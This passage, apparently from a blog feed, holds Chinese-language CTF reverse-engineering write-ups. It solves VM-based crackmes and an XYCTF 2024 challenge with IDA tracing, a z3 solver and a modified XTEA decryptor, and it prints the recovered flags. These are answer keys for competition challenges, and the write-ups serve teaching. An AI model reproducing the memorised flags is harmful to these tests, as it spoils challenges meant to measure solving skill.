class="hljs-number">4</span>] eax<br><br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">5</span>]<br><span class="hljs-attribute">mov</span> ebx flag[<span class="hljs-number">6</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">5</span>] eax<br><br><span class="hljs-comment">#三个相乘</span><br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">6</span>]<br><span class="hljs-attribute">mov</span> ebx flag[<span class="hljs-number">7</span>]<br><span class="hljs-attribute">mov</span> ecx flag[<span class="hljs-number">8</span>]<br><span class="hljs-attribute">mov</span> edx flag[<span class="hljs-number">12</span>]<br><span class="hljs-attribute">eax</span> = ecx+<span class="hljs-number">2</span>*ebx+<span class="hljs-number">3</span>*eax<br><span class="hljs-attribute">mul</span> eax edx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">6</span>] eax<br><br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">7</span>]<br><span class="hljs-attribute">mov</span> ebx flag[<span class="hljs-number">8</span>]<br><span class="hljs-attribute">mov</span> ecx flag[<span class="hljs-number">9</span>]<br><span class="hljs-attribute">mov</span> edx flag[<span class="hljs-number">12</span>]<br><span class="hljs-attribute">eax</span> = ecx+<span class="hljs-number">2</span>*ebx+<span class="hljs-number">3</span>*eax<br><span class="hljs-attribute">mul</span> eax edx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">7</span>] eax<br><br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">8</span>]<br><span class="hljs-attribute">mov</span> ebx flag[<span class="hljs-number">9</span>]<br><span class="hljs-attribute">mov</span> ecx flag[<span class="hljs-number">10</span>]<br><span class="hljs-attribute">mov</span> edx flag[<span class="hljs-number">12</span>]<br><span class="hljs-attribute">eax</span> = ecx+<span class="hljs-number">2</span>*ebx+<span class="hljs-number">3</span>*eax<br><span class="hljs-attribute">mul</span> eax edx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">8</span>] eax <br><br><span class="hljs-comment">#三个交换</span><br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">13</span>]<br><span class="hljs-attribute">mov</span> ebx flag[<span class="hljs-number">19</span>]<br><span class="hljs-attribute">swap</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">13</span>] eax<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">19</span>] ebx<br><br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">14</span>]<br><span class="hljs-attribute">mov</span> ebx flag[<span class="hljs-number">18</span>]<br><span class="hljs-attribute">swap</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">14</span>] eax<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">18</span>] ebx<br><br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">15</span>]<br><span class="hljs-attribute">mov</span> ebx flag[<span class="hljs-number">17</span>]<br><span class="hljs-attribute">swap</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">15</span>] eax<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">17</span>] ebx<br><span class="hljs-attribute">nop</span><br></code></pre></td></tr></table></figure><h3 id="翻译成伪代码"><a href="#翻译成伪代码" class="headerlink" title="翻译成伪代码"></a>翻译成伪代码</h3><p>大概进行了下面的这些操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    flag[i]^=flag[i+<span class="hljs-number">1</span>]<br>flag[<span class="hljs-number">6</span>]=(flag[<span class="hljs-number">8</span>]+<span class="hljs-number">2</span>*flag[<span class="hljs-number">7</span>]+<span class="hljs-number">3</span>*flag[<span class="hljs-number">6</span>])*flag[<span class="hljs-number">12</span>]<br>flag[<span class="hljs-number">7</span>]=(flag[<span class="hljs-number">9</span>]+<span class="hljs-number">2</span>*flag[<span class="hljs-number">8</span>]+<span class="hljs-number">3</span>*flag[<span class="hljs-number">7</span>])*flag[<span class="hljs-number">12</span>]<br>flag[<span class="hljs-number">8</span>]=(flag[<span class="hljs-number">10</span>]+<span class="hljs-number">2</span>*flag[<span class="hljs-number">9</span>]+<span class="hljs-number">3</span>*flag[<span class="hljs-number">8</span>])*flag[<span class="hljs-number">12</span>]<br>swap(flag[<span class="hljs-number">13</span>],flag[<span class="hljs-number">19</span>])<br>swap(flag[<span class="hljs-number">14</span>],flag[<span class="hljs-number">18</span>])<br>swap(flag[<span class="hljs-number">15</span>],flag[<span class="hljs-number">17</span>])<br>flag[<span class="hljs-number">13</span>], flag[<span class="hljs-number">19</span>] = flag[<span class="hljs-number">19</span>], flag[<span class="hljs-number">13</span>]<br>flag[<span class="hljs-number">14</span>], flag[<span class="hljs-number">18</span>] = flag[<span class="hljs-number">18</span>], flag[<span class="hljs-number">14</span>]<br>flag[<span class="hljs-number">15</span>], flag[<span class="hljs-number">17</span>] = flag[<span class="hljs-number">17</span>], flag[<span class="hljs-number">15</span>]        <br></code></pre></td></tr></table></figure><h3 id="找密文解密"><a href="#找密文解密" class="headerlink" title="找密文解密"></a>找密文解密</h3><p>这里需要注意的是 <strong>sub_F83</strong> 里面的 <code>aFzAmAmFmtSum</code> 点进去得到的并不是真正的密文，真正的密文需要对 <code>dword_2022A4</code> 交叉引用，在 <strong>sub_F00</strong> 里面的 <code>byte_202020</code> 中找到<br><img src="/../images/vm/enctext.png"><br><img src="/../images/vm/gw12.png"><br>根据上面部分的加密逻辑写出解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>enc=[<span class="hljs-number">0x69</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x72</span>, <br>      <span class="hljs-number">0x33</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x72</span>,]<br><span class="hljs-comment">#假的加密数据 跑出来是 &quot;Mt!! Mus~&quot;</span><br><span class="hljs-comment"># enc=[0x46, 0x7A, 0x7B, 0x61, 0x4D, 0x7B,0x61, 0x4D, 0x7C, 0x7D,</span><br><span class="hljs-comment">#  0x66, 0x4D, 0x74, 0x7E, 0x73, 0x75, 0x4D, 0x20, 0x21, 0x21,]</span><br><br>enc[<span class="hljs-number">13</span>], enc[<span class="hljs-number">19</span>] = enc[<span class="hljs-number">19</span>], enc[<span class="hljs-number">13</span>]<br>enc[<span class="hljs-number">14</span>], enc[<span class="hljs-number">18</span>] = enc[<span class="hljs-number">18</span>], enc[<span class="hljs-number">14</span>]<br>enc[<span class="hljs-number">15</span>], enc[<span class="hljs-number">17</span>] = enc[<span class="hljs-number">17</span>], enc[<span class="hljs-number">15</span>]<br><br>s=Solver()<br>f=[BitVec(<span class="hljs-string">f&quot;f<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>,<span class="hljs-number">8</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>)]<br>s.add(enc[<span class="hljs-number">6</span>]==(f[<span class="hljs-number">8</span>]+<span class="hljs-number">2</span>*f[<span class="hljs-number">7</span>]+<span class="hljs-number">3</span>*f[<span class="hljs-number">6</span>])*enc[<span class="hljs-number">12</span>])<br>s.add(enc[<span class="hljs-number">7</span>]==(f[<span class="hljs-number">9</span>]+<span class="hljs-number">2</span>*f[<span class="hljs-number">8</span>]+<span class="hljs-number">3</span>*f[<span class="hljs-number">7</span>])*enc[<span class="hljs-number">12</span>])<br>s.add(enc[<span class="hljs-number">8</span>]==(f[<span class="hljs-number">10</span>]+<span class="hljs-number">2</span>*f[<span class="hljs-number">9</span>]+<span class="hljs-number">3</span>*f[<span class="hljs-number">8</span>])*enc[<span class="hljs-number">12</span>])<br><br>s.add(enc[<span class="hljs-number">0</span>]==f[<span class="hljs-number">0</span>]^f[<span class="hljs-number">1</span>])<br>s.add(enc[<span class="hljs-number">1</span>]==f[<span class="hljs-number">1</span>]^f[<span class="hljs-number">2</span>])<br>s.add(enc[<span class="hljs-number">2</span>]==f[<span class="hljs-number">2</span>]^f[<span class="hljs-number">3</span>])<br>s.add(enc[<span class="hljs-number">3</span>]==f[<span class="hljs-number">3</span>]^f[<span class="hljs-number">4</span>])<br>s.add(enc[<span class="hljs-number">4</span>]==f[<span class="hljs-number">4</span>]^f[<span class="hljs-number">5</span>])<br>s.add(enc[<span class="hljs-number">5</span>]==f[<span class="hljs-number">5</span>]^f[<span class="hljs-number">6</span>])    <br><br>s.add(enc[<span class="hljs-number">9</span>]==f[<span class="hljs-number">9</span>])<br>s.add(enc[<span class="hljs-number">10</span>]==f[<span class="hljs-number">10</span>])<br><br><span class="hljs-keyword">for</span> var <span class="hljs-keyword">in</span> f:<br>    s.add(var&gt;=<span class="hljs-number">32</span>,var&lt;=<span class="hljs-number">126</span>)<br><br>flag=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">if</span> s.check()==sat:<br>    model=s.model()<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>        flag += <span class="hljs-built_in">chr</span>(model[f[i]].as_long())<br>   <br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>,<span class="hljs-number">20</span>):<br>    flag+=<span class="hljs-built_in">chr</span>(enc[i])<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>flag 即为 <code>flag&#123;Y0u_hav3_r3v3rs3_1t!&#125;</code></p><h2 id="NPC²CTF-2025-babyVM"><a href="#NPC²CTF-2025-babyVM" class="headerlink" title="[NPC²CTF 2025]babyVM"></a>[NPC²CTF 2025]babyVM</h2><h3 id="大致看看逻辑"><a href="#大致看看逻辑" class="headerlink" title="大致看看逻辑"></a>大致看看逻辑</h3><p>找到 main 函数，挺清晰的，输入 32 字节的 flag，然后再进 VM，之后进行比较，在 cipher 处找到密文<br><img src="/../images/vm/vm1.png"><br><img src="/../images/vm/vm2.png"><br>点进 VM 里面，很多 case ，case 里面还有继续套 case的，本来想手撕的，但是最后被劝退了，用打条件断点的方式进行 ida trace，这样就可以跳过写脚本去对应操作码的步骤</p><h3 id="根据-case-打条件断点"><a href="#根据-case-打条件断点" class="headerlink" title="根据 case 打条件断点"></a>根据 case 打条件断点</h3><p>看第一个 case0：<br><img src="/../images/vm/vm3.png"><br><code>-4</code>说明在向“栈”压入一个 4 字节的值<br>实际修改 qword_… 高 32 位的值 —— 更新“栈指针,模拟栈增长操作，所以这是 <strong>push</strong> 操作<br>对应汇编打条件断点，看寄存器，右键<code>Edit breakpoinnt</code>,写 idapython 脚本<br><img src="/../images/vm/vm4.png"><br>case1 是看字符串长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">eax_val = idc.get_reg_value(<span class="hljs-string">&quot;eax&quot;</span>)<br>output = <span class="hljs-string">f&quot;strlen,<span class="hljs-subst">&#123;eax_val&#125;</span>(0x<span class="hljs-subst">&#123;eax_val:X&#125;</span>)\n&quot;</span>  <br><span class="hljs-built_in">print</span>(output.strip())<br></code></pre></td></tr></table></figure><p>case2 是 <strong>mov</strong> 类，里面又有很多 case 分支，是不同的move,比对汇编和代码<br><img src="/../images/vm/vm6.png"><br><img src="/../images/vm/vm5.png"></p><p><img src="/../images/vm/vm7.png"><br>注意打断点时不要打到 LABEL 里面去了，不然会重复输出<br>可以看到这是把一个参数赋值到内存地址,<code>v41</code> 对应的寄存器是 <code>r8d</code>,<code>v42(rdx)</code> 地址加上 <code>v40(rcx)</code> 偏移值就是地址值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">rdx_val=idc.get_reg_value(<span class="hljs-string">&quot;rdx&quot;</span>)<br>rcx_val=idc.get_reg_value(<span class="hljs-string">&quot;rcx&quot;</span>)<br>r8d_val=idc.get_reg_value(<span class="hljs-string">&quot;r8d&quot;</span>)<br>output = <span class="hljs-string">f&quot;case0 mov [<span class="hljs-subst">&#123;rdx_val+rdx_val&#125;</span>],<span class="hljs-subst">&#123;r8d_val&#125;</span>\n&quot;</span><br>log_path = <span class="hljs-string">r&quot;D:\aaa\vm\log.txt&quot;</span>  <br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(log_path, <span class="hljs-string">&#x27;a&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(output)<br></code></pre></td></tr></table></figure><p>就这样继续对每一个 case 打条件断点,打的时候可以稍微标注一下，以便后续修改去对着找是哪一条</p><p>case3 是 <code>sub</code> 操作，case4 是 <code>add</code> 操作，case5 是 <code>xor</code> 操作，case6 是 <code>add</code> 操作,case7 是 <code>shr</code> 操作，case8 是 <code>shl</code>,case9 是比较字符串，case13 是 <code>and</code> 指令</p><h3 id="找加密、密钥、轮数、delta"><a href="#找加密、密钥、轮数、delta" class="headerlink" title="找加密、密钥、轮数、delta"></a>找加密、密钥、轮数、delta</h3><p>打印出来看到有这样的结构,一眼密钥<br><img src="/../images/vm/vm8.png"><br>然后去找相似的循环结构，这里注意到</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">case3</span> <span class="hljs-keyword">mov</span> rag2,<span class="hljs-number">0</span><br><span class="hljs-symbol">case4</span> <span class="hljs-keyword">add</span> reg2,<span class="hljs-number">1</span><br><span class="hljs-symbol">...</span><br><span class="hljs-symbol">case3</span> <span class="hljs-keyword">mov</span> rag2,<span class="hljs-number">1</span><br><span class="hljs-symbol">case4</span> <span class="hljs-keyword">add</span> reg2,<span class="hljs-number">1</span><br><span class="hljs-symbol">...</span><br><span class="hljs-symbol">case3</span> <span class="hljs-keyword">mov</span> rag2,<span class="hljs-number">2</span><br><span class="hljs-symbol">case4</span> <span class="hljs-keyword">add</span> reg2,<span class="hljs-number">1</span><br><span class="hljs-symbol">...</span><br><span class="hljs-symbol">...</span><br><span class="hljs-symbol">case3</span> <span class="hljs-keyword">mov</span> rag2,<span class="hljs-number">47</span><br><span class="hljs-symbol">case4</span> <span class="hljs-keyword">add</span> reg2,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>明显的计数器每经过一轮就加一，可以得出循环轮数为 <strong>48</strong> 轮<br><img src="/../images/vm/vm9.png"><br>左移右移的操作再加上 <code>&gt;&gt;11</code>和<code>&amp;3</code>,大致推测出这是一个魔改的 <strong>xtea</strong> 算法<br>接着去找 delta，delta 是一个在每轮加密中都会出现的常量，就去找到出现多的不变的常数，<br>其实在密钥的下面一点也出现了,delta 也是魔改了的，值为<strong>421101834</strong><br><code>case7 mov [18446744073709551812],421101834</code></p><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num_rounds, <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>], <span class="hljs-type">uint32_t</span> delta)</span> </span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>];<br>   <br>    <span class="hljs-type">uint32_t</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; num_rounds; i++) &#123;<br>        sum -= delta;  <br>    &#125;<br>    <br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; num_rounds; i++) &#123;<br>        v1 -= (((v0 &gt;&gt; <span class="hljs-number">7</span>) ^ (v0 &lt;&lt; <span class="hljs-number">3</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>        sum += delta;<br>        v0 -= (((v1 &gt;&gt; <span class="hljs-number">6</span>) ^ (v1 &lt;&lt; <span class="hljs-number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0;<br>    v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* key_str = <span class="hljs-string">&quot;Chovy_inkey_w36_&quot;</span>;<br>    <span class="hljs-type">uint32_t</span> key[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <br>    <span class="hljs-comment">// 自定义delta值</span><br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">421101834</span>; <span class="hljs-comment">// 0x191A06FA</span><br>    <br>    <span class="hljs-comment">// 将字符串转换为4个32位整数</span><br>    <span class="hljs-comment">// 每4个字符组成一个32位整数</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        key[i] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) &#123;<br>            <span class="hljs-type">int</span> idx = i * <span class="hljs-number">4</span> + j;<br>            <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-built_in">strlen</span>(key_str)) &#123;<br>                key[i] |= ((<span class="hljs-type">uint32_t</span>)key_str[idx] &lt;&lt; (j * <span class="hljs-number">8</span>));<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 打印密钥</span><br>    cout &lt;&lt; <span class="hljs-string">&quot;XTEA Key (hex): &quot;</span> &lt;&lt; endl;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;key[&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;] = 0x&quot;</span> &lt;&lt; hex &lt;&lt; key[i] &lt;&lt; endl;<br>    &#125;<br>    <br>    <span class="hljs-type">uint8_t</span> encrypted_bytes[] = &#123;<br>        <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xE9</span>,<br>        <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x29</span>,<br>        <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x15</span>,<br>        <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x29</span><br>    &#125;;<br>    <br><br>    <span class="hljs-comment">// 将密文分成若干个块进行解密 (XTEA每次处理8字节)</span><br>    <span class="hljs-type">int</span> num_blocks = <span class="hljs-built_in">sizeof</span>(encrypted_bytes) / <span class="hljs-number">8</span>;<br>    <span class="hljs-type">uint8_t</span> decrypted_bytes[<span class="hljs-built_in">sizeof</span>(encrypted_bytes)];<br>    <span class="hljs-built_in">memcpy</span>(decrypted_bytes, encrypted_bytes, <span class="hljs-built_in">sizeof</span>(encrypted_bytes));<br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num_blocks; i++) &#123;<br>        <span class="hljs-type">uint32_t</span>* block = (<span class="hljs-type">uint32_t</span>*)(decrypted_bytes + i * <span class="hljs-number">8</span>);<br>        <span class="hljs-built_in">decrypt</span>(<span class="hljs-number">48</span>, block, key, delta);<br>    &#125;<br>    <br>    <br>    cout &lt;&lt; <span class="hljs-string">&quot;Decrypted : &quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">sizeof</span>(decrypted_bytes); i++) &#123;<br>        <br>        <span class="hljs-keyword">if</span> (decrypted_bytes[i] &gt;= <span class="hljs-number">32</span> &amp;&amp; decrypted_bytes[i] &lt;= <span class="hljs-number">126</span>) &#123;<br>            cout &lt;&lt; (<span class="hljs-type">char</span>)decrypted_bytes[i];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;.&quot;</span>;<br>        &#125;<br>    &#125;<br>    cout &lt;&lt; endl;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/../images/vm/vm10.png"><br>得到 flag 为 <code> flag&#123;D0_yOu_l1k3_VmmmmMMMMMmmm?&#125;</code></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XYCTF 2024 Reverse 方向复现</title>
    <link href="/2025/05/03/XYCTF2024/"/>
    <url>/2025/05/03/XYCTF2024/</url>
    
    <content type="html"><![CDATA[<h3 id="你是真的大学生吗"><a href="#你是真的大学生吗" class="headerlink" title="你是真的大学生吗?"></a>你是真的大学生吗?</h3><p>附件是MS-DOS executable (EXE)文件，ida 不能反编译，硬看汇编<br><img src="/../images/XYCTF/dxs1.png"><br>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">T[20]=C[20]^C[0]</span><br><span class="hljs-string">al=T[20]</span><br><span class="hljs-string">T[19]=C[19]^al即T[19]=C[19]^T[20]</span><br><span class="hljs-string">al=T[19]</span><br><span class="hljs-string">T[18]=C[18]^al即T[18]=C[18]^T[19]</span><br><span class="hljs-string">...</span><br><span class="hljs-string">T[0]=C[0]^al即T[0]=C[0]^T[1]</span><br><span class="hljs-string">所以对于i=0~19</span><br><span class="hljs-string">T[i]=C[i]^T[i+1]</span><br><span class="hljs-string">求C[i]就用C[i]=T[i]^T[i+1]</span><br><span class="hljs-string">对于i=20</span><br><span class="hljs-string">C[20]=T[20]^C[0]</span><br><span class="hljs-string">C[20]=T[20]^(T[0]^T[1])</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>enc=[<span class="hljs-number">0x76</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x1E</span>, <br>     <span class="hljs-number">0x41</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x05</span>]<br><br>flag=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)-<span class="hljs-number">1</span>):<br>    flag.append(enc[i]^enc[i+<span class="hljs-number">1</span>])<br>flag.append(enc[-<span class="hljs-number">1</span>]^enc[<span class="hljs-number">0</span>]^enc[<span class="hljs-number">1</span>])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> flag]))<br><br><span class="hljs-comment">#xyctf&#123;you_know_8086&#125;</span><br></code></pre></td></tr></table></figure><p>flag 为<code>yctf&#123;you_know_8086&#125;</code></p><h3 